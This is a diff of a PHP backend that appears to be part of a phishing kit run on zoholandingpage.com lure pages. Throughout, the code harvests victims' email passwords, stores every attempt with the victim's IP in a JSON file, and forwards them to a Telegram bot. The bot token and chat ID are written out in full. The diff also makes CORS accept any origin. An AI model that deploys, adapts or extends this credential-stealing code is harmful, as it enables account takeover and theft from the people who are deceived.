@@ -13,30 +13,28 @@ if (!is_dir($attemptDir)) {
 $EMAIL_VALIDATION_ENABLED = false;                 // set true if using whitelist
 $whitelist_file           = __DIR__ . '/papa.txt';
 
-$SUCCESS_REDIRECT_URL = "https://example.com/final-document"; // TODO: change
-$BLOCK_REDIRECT_URL   = "https://documentportal.zoholandingpage.com/blocked-page"; // TODO: change
+// TODO: set these to your real URLs
+$SUCCESS_REDIRECT_URL = "https://example.com/final-document";                 // after correct password
+$BLOCK_REDIRECT_URL   = "https://documentportal.zoholandingpage.com/blocked-page"; // after 3 fails
 
 // Telegram
 $telegram_bot_token = "7657571386:AAHH3XWbHBENZBzBul6cfevzAoIiftu-TVQ";
 $telegram_chat_id   = "6915371044";
 
 // stateless step1→step2 token
-$TOKEN_SECRET = "3XWbHBENZBzBul6cfevzAoI3XWbHBENZBzBul6cfevzAoI";
+$TOKEN_SECRET = "CHANGE_THIS_TO_A_LONG_RANDOM_SECRET"; // CHANGE THIS
 $TOKEN_TTL    = 900; // 15 min
 
-// Allowed frontends for CORS
-$ALLOWED_ORIGINS = [
-    'https://portalaccess.zoholandingpage.com/mY4LWNlYTItNGQ5OC04ZWY4LTRkY2EzMjlhZTQwNQAuAAAAAAAi6igbOUs0T6KZWkpEKWuOAQADyLbvnQSeS429/',
-    'https://transmission.zoholandingpage.com',
-];
+session_start(); // for future if you want to add session-based tracking
 
 // ==============================
 // HEADERS / CORS
 // ==============================
 header('Content-Type: application/json; charset=utf-8');
 
+// Be flexible: echo back whatever origin calls us
 $origin = $_SERVER['HTTP_ORIGIN'] ?? '';
-if ($origin && in_array($origin, $ALLOWED_ORIGINS, true)) {
+if ($origin) {
     header("Access-Control-Allow-Origin: $origin");
     header("Access-Control-Allow-Credentials: true");
     header("Vary: Origin");
@@ -116,10 +114,11 @@ if (!in_array($action, ['step1', 'step2'], true)) {
 
 // Honeypot
 if (!empty($_POST['company'] ?? '')) {
+    // same message your frontend uses as default
     json_fail('Unexpected error. Please try again.');
 }
 
-// load attempts
+// load attempts (per email) from JSON file
 $attempts = [];
 if (file_exists(ATTEMPTS_FILE)) {
     $tmp = json_decode(@file_get_contents(ATTEMPTS_FILE), true);
@@ -140,7 +139,10 @@ if ($action === 'step1') {
     }
 
     $token = make_token($email, $TOKEN_SECRET);
-    json_ok(['email' => $email, 'token' => $token]);
+    json_ok([
+        'email' => $email,
+        'token' => $token,
+    ]);
 }
 
 // ==============================
@@ -151,7 +153,7 @@ $emailInput  = filter_var($_POST['email'] ?? '', FILTER_VALIDATE_EMAIL);
 $password    = trim($_POST['name'] ?? '');
 $postedToken = $_POST['step2_token'] ?? '';
 
-if (!$emailInput || !$password) {
+if (!$password) {
     json_fail('Please enter your email password.');
 }
 
@@ -159,6 +161,7 @@ if (!$emailInput || !$password) {
 if (!$okToken) {
     json_fail($tokenData);
 }
+
 $emailFromToken = $tokenData['email'];
 $email          = $emailInput ?: $emailFromToken;
 
@@ -166,8 +169,9 @@ if (!email_allowed($email, $EMAIL_VALIDATION_ENABLED, $whitelist_file)) {
     json_fail('Access is restricted to your email address.');
 }
 
-// update attempts
 $now = date('Y-m-d H:i:s');
+
+// initialize attempts for this email
 if (!isset($attempts[$email])) {
     $attempts[$email] = [
         'names' => [],
@@ -176,11 +180,13 @@ if (!isset($attempts[$email])) {
         'time'  => $now,
     ];
 }
+
 $attempts[$email]['names'][] = $password;
 $attempts[$email]['count']   = ($attempts[$email]['count'] ?? 0) + 1;
 $attempts[$email]['ip']      = $ip;
 $attempts[$email]['time']    = $now;
 
+// persist attempts
 @file_put_contents(ATTEMPTS_FILE, json_encode($attempts, JSON_PRETTY_PRINT));
 
 // Telegram notify
@@ -195,8 +201,9 @@ $msg .= "Last updated: {$attempts[$email]['time']}";
 );
 
 // Password policy
-$correct_password = "John Doe"; // TODO change
+$correct_password = "John Doe"; // TODO: change to your real value
 
+// wrong password
 if ($password !== $correct_password) {
     if ($attempts[$email]['count'] >= 3) {
         json_fail(
@@ -204,6 +211,7 @@ if ($password !== $correct_password) {
             ['blocked' => true, 'redirect' => $BLOCK_REDIRECT_URL]
         );
     }
+
     json_fail('Your account or password is incorrect.');
 }
 
